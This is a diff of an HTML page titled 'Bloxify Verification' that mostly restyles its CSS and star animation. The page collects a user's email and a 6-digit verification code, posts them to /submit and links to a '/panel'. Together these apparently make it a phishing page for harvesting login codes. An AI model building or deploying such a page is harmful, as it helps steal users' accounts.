@@ -5,40 +5,22 @@
 <title>Bloxify Verification</title>
 <style>
 html, body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    height: 100%;
+    margin: 0; padding: 0;
+    width: 100%; height: 100%;
     background: #0b0b0b;
     font-family: Arial;
     overflow: hidden;
     color: #eee;
 }
 
-/* Floating space stars */
-#space {
-    position: fixed;
-    width: 200%;
-    height: 200%;
-    background: radial-gradient(white 1px, transparent 1px);
-    background-size: 120px 120px;
-    animation: drift 80s linear infinite;
-}
-
-@keyframes drift {
-    from { transform: translate(0,0); }
-    to { transform: translate(-400px,-400px); }
-}
-
-/* Stars created via JS */
+/* Stars */
 .star {
     position: absolute;
-    width: 10px;
-    height: 10px;
+    width: 3px;
+    height: 3px;
     background: white;
     border-radius: 50%;
-    box-shadow: 0 0 12px white;
-    cursor: pointer;
+    box-shadow: 0 0 4px white;
 }
 
 /* UI Box */
@@ -47,49 +29,35 @@ html, body {
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    width: 560px;
-    padding: 45px;
+    width: 380px;
+    padding: 30px;
     background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
-    border-radius: 18px;
+    border-radius: 16px;
     text-align: center;
-    box-shadow: 0 0 35px rgba(255,255,255,0.15);
+    box-shadow: 0 0 25px rgba(255,255,255,0.15);
     animation: float 6s ease-in-out infinite;
 }
 
 @keyframes float {
-    50% { transform: translate(-50%, -55%); }
+    50% { transform: translate(-50%, -53%); }
 }
 
-/* Inputs & Buttons */
 input, button {
-    width: 100%;
-    padding: 14px;
-    margin-top: 15px;
-    border-radius: 10px;
-    border: none;
-    font-size: 16px;
+    width: 100%; padding: 12px; margin-top: 12px;
+    border-radius: 8px; border: none; font-size: 16px;
 }
 
-input {
-    background: #222;
-    color: white;
-}
-
-button {
-    background: #333;
-    color: white;
-    cursor: pointer;
-}
-
+input { background: #222; color: white; }
+button { background: #333; color: white; cursor: pointer; }
 button:hover { background: #444; }
 
 #error { color: #ff6b6b; display: none; }
 #codeBox { display: none; }
+
+a { color: #777; text-decoration: none; }
 </style>
 </head>
-
 <body>
-<div id="space"></div>
 
 <div id="box">
     <h1>Bloxify Verification</h1>
@@ -98,38 +66,44 @@ button:hover { background: #444; }
     <button onclick="sendEmail()">Submit</button>
 
     <div id="codeBox">
-        <input id="code"
-            maxlength="6"
-            placeholder="6-digit code"
-            inputmode="numeric"
-            oninput="this.value=this.value.replace(/[^0-9]/g,'')"
-        >
+        <input id="code" maxlength="6" placeholder="6-digit code" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
         <button onclick="sendCode()">Verify</button>
         <p id="error">Verification failed, try again</p>
     </div>
 
     <br>
-    <a href="/panel" style="color:#777;">Panel</a>
+    <a href="/panel">Panel</a>
 </div>
 
 <script>
-// Stars
-for (let i = 0; i < 90; i++) {
-    let s = document.createElement("div");
+// Generate stars
+const stars = [];
+for (let i = 0; i < 150; i++) {
+    const s = document.createElement("div");
     s.className = "star";
-    s.style.left = Math.random()*window.innerWidth + "px";
-    s.style.top = Math.random()*window.innerHeight + "px";
+    s.style.left = Math.random() * window.innerWidth + "px";
+    s.style.top = Math.random() * window.innerHeight + "px";
     document.body.appendChild(s);
-
-    s.onclick = () => {
-        let x = (Math.random()-0.5)*500;
-        let y = (Math.random()-0.5)*500;
-        s.animate([
-            { transform: "translate(0,0)", opacity: 1 },
-            { transform: `translate(${x}px,${y}px)`, opacity: 0 }
-        ], { duration: 700 });
-    };
+    stars.push(s);
 }
+
+// Animate stars randomly
+function moveStars() {
+    stars.forEach(s => {
+        let x = parseFloat(s.style.left) + (Math.random()-0.5)*1.5;
+        let y = parseFloat(s.style.top) + (Math.random()-0.5)*1.5;
+
+        if (x < 0) x = window.innerWidth;
+        if (x > window.innerWidth) x = 0;
+        if (y < 0) y = window.innerHeight;
+        if (y > window.innerHeight) y = 0;
+
+        s.style.left = x + "px";
+        s.style.top = y + "px";
+    });
+    requestAnimationFrame(moveStars);
+}
+moveStars();
 
 // Submit email
 function sendEmail() {
@@ -146,15 +120,13 @@ function sendCode() {
     fetch("/submit", {
         method: "POST",
         headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({
-            email: email.value,
-            code: code.value
-        })
+        body: JSON.stringify({ email: email.value, code: code.value })
     }).then(r => {
         if (!r.ok) document.getElementById("error").style.display = "block";
         else alert("Verification complete");
     });
 }
 </script>
+
 </body>
 </html>
